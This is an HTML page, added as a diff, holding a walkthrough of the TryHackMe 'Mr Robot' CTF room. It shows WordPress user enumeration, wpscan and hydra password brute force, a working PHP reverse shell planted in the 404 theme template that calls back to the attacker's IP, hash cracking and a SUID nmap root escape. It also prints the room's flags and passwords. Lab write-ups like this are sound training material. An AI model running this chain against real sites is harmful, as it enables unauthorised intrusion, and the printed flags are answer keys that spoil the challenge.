@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Mr Robot CTF — TryHackMe walkthrough</title>
+<meta name="description" content="Walkthrough for the Mr Robot CTF room on TryHackMe: WordPress brute-force, 404 template RCE, hash cracking, and SUID nmap privilege escalation." />
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,500;0,9..144,600;1,9..144,500&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+<link rel="stylesheet" href="styles/mr-robot.css" />
+</head>
+<body>
+<div class="wrap">
+
+  <a href="../walkthroughs.html" class="back">back to walkthroughs</a>
+
+  <header class="wt-header">
+    <div class="wt-platform"><span class="dot">●</span> TryHackMe</div>
+    <h1>Mr Robot <em>CTF</em></h1>
+    <div class="wt-meta">
+      <span class="badge medium">Medium</span>
+      <span class="badge tag">web</span>
+      <span class="badge tag">wordpress</span>
+      <span class="badge tag">linux</span>
+      <span class="badge tag">suid</span>
+    </div>
+    <p class="wt-summary">
+      A classic Mr Robot-themed box. Enumerate a WordPress site, brute-force credentials with
+      a wordlist handed to us by the machine itself, drop a reverse shell into a template file,
+      crack an MD5 hash, then exploit an old <code>nmap</code> binary with the SUID bit set to
+      land root — all while collecting three keys along the way.
+    </p>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">Contents</div>
+    <ol>
+      <li><a href="#recon">Reconnaissance</a></li>
+      <li><a href="#key1">Key 1 — robots.txt</a></li>
+      <li><a href="#wp">WordPress brute-force</a></li>
+      <li><a href="#shell">Foothold — reverse shell</a></li>
+      <li><a href="#key2">Key 2 — hash cracking</a></li>
+      <li><a href="#key3">Key 3 — SUID nmap privesc</a></li>
+    </ol>
+  </nav>
+
+  <h2 id="recon"><span class="num">01</span> Reconnaissance</h2>
+
+  <p>Full TCP scan with service detection and default scripts:</p>
+  <pre><code>nmap -sC -sV -p- -T4 10.10.X.X -oN nmap.txt</code></pre>
+
+  <p>Only three ports of interest come back — SSH is closed, and the web stack is live on both HTTP and HTTPS:</p>
+  <pre class="output"><code>PORT    STATE  SERVICE   VERSION
+22/tcp  closed ssh
+80/tcp  open   http      Apache httpd
+443/tcp open   ssl/http  Apache httpd</code></pre>
+
+  <p>The site at port 80 is a full-screen interactive Mr Robot terminal — cute, but nothing exploitable in the source. Time to directory-brute with Gobuster:</p>
+
+  <pre><code>gobuster dir -u http://10.10.X.X/ \
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+  -x php,txt,html -t 40 -o gobuster.txt</code></pre>
+
+  <p>A few interesting hits show up — most notably <code>/robots.txt</code>, <code>/wp-login.php</code>, and <code>/license</code>.</p>
+
+  <h2 id="key1"><span class="num">02</span> Key 1 — robots.txt</h2>
+
+  <pre><code>curl http://10.10.X.X/robots.txt</code></pre>
+  <pre class="output"><code>User-agent: *
+fsocity.dic
+key-1-of-3.txt</code></pre>
+
+  <p>Two files, straight up. Grab both:</p>
+
+  <pre><code>curl http://10.10.X.X/key-1-of-3.txt
+wget http://10.10.X.X/fsocity.dic</code></pre>
+
+  <p>Key 1: <span class="flag">073403c8a58a1f80d943455fb30724b9</span></p>
+
+  <p>The <code>fsocity.dic</code> file is a wordlist — but full of duplicates. De-dupe before using it or you'll waste hours:</p>
+
+  <pre><code>wc -l fsocity.dic            # ~858160 lines
+sort -u fsocity.dic -o fsocity.sorted.dic
+wc -l fsocity.sorted.dic      # ~11451 lines</code></pre>
+
+  <h2 id="wp"><span class="num">03</span> WordPress brute-force</h2>
+
+  <p>WordPress's login page leaks valid usernames: if the username exists, the error message says <em>"the password you entered for the username X is incorrect"</em>, otherwise it says <em>"invalid username"</em>. We can use that to enumerate users via <code>wpscan</code> — but faster, the fsocity dictionary itself contains the username. Try the obvious one:</p>
+
+  <pre><code>curl -s -c /dev/null -X POST \
+  -d "log=Elliot&pwd=whatever&wp-submit=Log+In" \
+  http://10.10.X.X/wp-login.php | grep -oE "(Invalid username|incorrect)"</code></pre>
+
+  <p>Response contains <code>"incorrect"</code> — <strong>Elliot</strong> is a valid user. Now brute the password:</p>
+
+  <pre class="exploit"><code>wpscan --url http://10.10.X.X \
+  --usernames Elliot \
+  --passwords fsocity.sorted.dic \
+  --max-threads 40</code></pre>
+
+  <p>After a few minutes:</p>
+  <pre class="output"><code>[SUCCESS] - Elliot / ER28-0652</code></pre>
+
+  <div class="note">
+    If <code>wpscan</code> is slow on your box, <code>hydra</code> works too:
+    <code>hydra -l Elliot -P fsocity.sorted.dic 10.10.X.X http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=incorrect"</code>
+  </div>
+
+  <h2 id="shell"><span class="num">04</span> Foothold — reverse shell</h2>
+
+  <p>Login at <code>/wp-login.php</code> as <code>Elliot:ER28-0652</code>. WordPress gives admin access — we can abuse the theme editor to write PHP directly to disk.</p>
+
+  <p>Navigate to <strong>Appearance → Editor</strong> and open <code>404.php</code> (any template that's easy to trigger works — 404 is convenient because any invalid URL renders it). Replace the whole file with a PHP reverse shell. I use a trimmed pentestmonkey variant:</p>
+
+  <pre class="exploit"><code>&lt;?php
+set_time_limit(0);
+$ip   = '10.X.X.X';     // your tun0 IP
+$port = 4444;
+$sock = fsockopen($ip, $port);
+$desc = array(0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock);
+$proc = proc_open('/bin/sh -i', $desc, $pipes);
+proc_close($proc);
+?&gt;</code></pre>
+
+  <p>Save. In another terminal, start a listener:</p>
+  <pre><code>nc -lnvp 4444</code></pre>
+
+  <p>Trigger the template by visiting any URL that 404s:</p>
+  <pre><code>curl http://10.10.X.X/404-trigger</code></pre>
+
+  <p>Shell lands as <code>daemon</code>. Upgrade to a proper TTY immediately — you'll need it for <code>su</code> later:</p>
+
+  <pre><code>python -c 'import pty;pty.spawn("/bin/bash")'
+# Ctrl-Z
+stty raw -echo; fg
+# then in shell:
+export TERM=xterm
+stty rows 38 columns 116</code></pre>
+
+  <h2 id="key2"><span class="num">05</span> Key 2 — hash cracking</h2>
+
+  <pre><code>cd /home
+ls
+# robot
+cd robot &amp;&amp; ls -la</code></pre>
+
+  <pre class="output"><code>-r-------- 1 robot robot  33 key-2-of-3.txt
+-r--r--r-- 1 robot robot  39 password.raw-md5</code></pre>
+
+  <p><code>key-2-of-3.txt</code> is <strong>not</strong> readable by <code>daemon</code>, but <code>password.raw-md5</code> is world-readable:</p>
+
+  <pre><code>cat password.raw-md5</code></pre>
+  <pre class="output"><code>robot:c3fcd3d76192e4007dfb496cca67e13b</code></pre>
+
+  <p>Crack it — rockyou has it, but CrackStation is instant. With hashcat:</p>
+
+  <pre class="exploit"><code>echo 'c3fcd3d76192e4007dfb496cca67e13b' &gt; hash.txt
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+  <p>Plaintext: <code>abcdefghijklmnopqrstuvwxyz</code> — literally the lowercase alphabet.</p>
+
+  <pre><code>su robot
+# password: abcdefghijklmnopqrstuvwxyz
+cat key-2-of-3.txt</code></pre>
+
+  <p>Key 2: <span class="flag">822c73956184f694993bede3eb39f959</span></p>
+
+  <h2 id="key3"><span class="num">06</span> Key 3 — SUID nmap privesc</h2>
+
+  <p>Enumerate SUID binaries:</p>
+  <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+  <pre class="output"><code>/usr/local/bin/nmap
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/su
+/usr/bin/passwd
+...</code></pre>
+
+  <p><code>/usr/local/bin/nmap</code> is the tell — old nmap versions (≤ 5.21) shipped an interactive mode that spawns a shell inheriting SUID privileges. Check the version:</p>
+
+  <pre><code>nmap --version</code></pre>
+  <pre class="output"><code>Nmap version 3.81</code></pre>
+
+  <p>Perfect, well within the vulnerable range. Drop into interactive mode and escape to a shell:</p>
+
+  <pre class="exploit"><code>nmap --interactive
+nmap&gt; !sh
+# whoami → root</code></pre>
+
+  <p>And the last flag:</p>
+  <pre><code>cat /root/key-3-of-3.txt</code></pre>
+
+  <p>Key 3: <span class="flag">04787ddef27c3dee1ee161b21670b4e4</span></p>
+
+  <h2><span class="num">07</span> Wrap-up</h2>
+
+  <p>The whole chain:</p>
+  <ol>
+    <li>Found wordlist + first key in <code>robots.txt</code>.</li>
+    <li>De-duped the dictionary, confirmed <code>Elliot</code> as valid user via login error message.</li>
+    <li>Brute-forced the WP password with <code>wpscan</code> — <code>ER28-0652</code>.</li>
+    <li>Edited the 404 theme file to drop a PHP reverse shell, triggered it with a 404.</li>
+    <li>Cracked <code>robot</code>'s MD5 hash → user 2 flag.</li>
+    <li>Abused SUID <code>nmap --interactive</code> to escape to a root shell → user 3 flag.</li>
+  </ol>
+
+  <p><em>Takeaways:</em> always de-dupe found wordlists, always check WP login error messages for enum oracles, and always check SUID binary versions — old <code>nmap</code> and <code>find -exec</code> are classics for a reason.</p>
+
+  <footer>
+    <div>LOOKY · writeup</div>
+    <div>TryHackMe · Mr Robot CTF</div>
+  </footer>
+
+</div>
+</body>
+</html>
